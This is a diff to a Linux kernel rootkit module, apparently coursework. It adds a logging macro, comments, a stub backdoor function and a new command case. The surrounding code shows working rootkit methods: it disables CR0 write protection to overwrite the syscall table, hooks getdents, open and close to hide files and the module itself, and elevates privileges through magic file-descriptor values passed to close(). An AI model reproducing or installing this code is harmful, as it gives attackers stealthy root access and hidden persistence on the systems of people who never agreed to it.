@@ -27,6 +27,10 @@ typedef unsigned int pointer_size_t;
 #define BUFSIZE 32768
 #define HIDE_PREFIX "cse509--"
 
+#define RKIT_VERBOSE 1
+#define PUBMSG(x) {if (RKIT_VERBOSE == 1) { \
+    printk(KERN_ERR "RKIT: %s\n", x);}}
+
 struct linux_dirent {
     unsigned long       d_ino;
     unsigned long       d_off;
@@ -67,7 +71,7 @@ u_int8_t hide_files_flag;
 #define ADD_BACKDOOR -31337
 /***************************************************************************/
 
-/* To store a pointer to original close() */
+/* To store a pointer to original syscalls */
 asmlinkage int (*original_close)(int fd);
 asmlinkage int (*original_getdents)(unsigned int fd,
                                     struct linux_dirent *dirp,
@@ -76,7 +80,9 @@ asmlinkage int (*original_getdents)(unsigned int fd,
 asmlinkage long (*original_open)(const char __user *pathname,
                                  int flags,
                                  mode_t mode);
+//<<<<<< asmlinkage long (*original_read)();
 
+/* Modify the CR0 register to block writes on syscall table */
 static void disable_write_protection(void)
 {
     unsigned long value;
@@ -87,6 +93,7 @@ static void disable_write_protection(void)
     }
 }
 
+/* Modify the CR0 register to allow writes on syscall table */
 static void enable_write_protection(void)
 {
     unsigned long value;
@@ -95,6 +102,13 @@ static void enable_write_protection(void)
         value |= X86_CR0_WP;
         asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
     }
+}
+
+/*========== Rootkit functionality  ==========*/
+
+int add_backdoor(void)
+{
+    return 0;
 }
 
 int hide_files(void)
@@ -117,6 +131,7 @@ int show_files(void)
     return err;
 }
 
+/* Hide and show the module */
 int hide_module(void)
 {
     int err = 0;
@@ -275,6 +290,8 @@ int filename_matches_pattern(const char *filename)
     return strncmp(filename, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0;
 }
 
+
+/*========== Hijacked syscalls' definition ==========*/
 asmlinkage int my_getdents(unsigned int fd,
                            struct linux_dirent *dirp,
                            unsigned int count)
@@ -334,7 +351,6 @@ out:
 asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 {
     long fd;
-    //printk("Hijacked open called\n");
     fd = original_open(pathname, flags, mode);
 
     if (fd >= 0 && is_userspace_str(pathname, "/proc")) {
@@ -351,9 +367,9 @@ asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 asmlinkage int my_close(int fd)
 {
     int err = 0;
-    //printk("Hijacked close called\n");
     if (fd < 0) {
         switch (fd) {
+        // None of this ever fails? <<<<<< Must fix!
         case ELEVATE_UID:
             elevate_current_privileges();
             break;
@@ -375,6 +391,11 @@ asmlinkage int my_close(int fd)
         case SHOW_MODULE:
             show_module();
             break;
+        case ADD_BACKDOOR:
+            add_backdoor();
+            break;
+        default:
+            PUBMSG("Wrong rootkit command!");
         }
     }
     else {
@@ -416,7 +437,7 @@ void deinit_buf_struct(void)
 int rootkit_init(void)
 {
     //struct page *sys_call_page_temp;
-    printk("Rootkit loaded\n");
+    PUBMSG("Rootkit loaded");
     proc_open_fd = -1;
     proc_open_pid = -1;
     module_hidden = 0;
@@ -439,7 +460,7 @@ int rootkit_init(void)
         goto out;
     }
 
-    printk("Syscall table at %p\n", syscall_table);
+    //printk(KERN_EMERG "Syscall table at %p\n", syscall_table);
 
     // Disable write protection on page
     disable_write_protection();
@@ -467,7 +488,7 @@ void rootkit_exit(void)
     deinit_buf_struct();
 
     if (syscall_table == NULL) {
-        printk("RKIT: Nothing to unload\n");
+        PUBMSG("RKIT: Nothing to unload\n");
         goto out;
     }
 
@@ -477,13 +498,14 @@ void rootkit_exit(void)
     syscall_table[__NR_close]    = (void *) original_close;
     syscall_table[__NR_open]     = (void *) original_open;
     syscall_table[__NR_getdents] = (void *) original_getdents;
+    //<<<<<<Do this for read syscall
 
     // Enable write protection on page
     enable_write_protection();
 
 out:
     show_module();
-    printk("Rootkit unloaded\n");
+    PUBMSG("Rootkit unloaded\n");
 }
 
 MODULE_LICENSE("GPL");
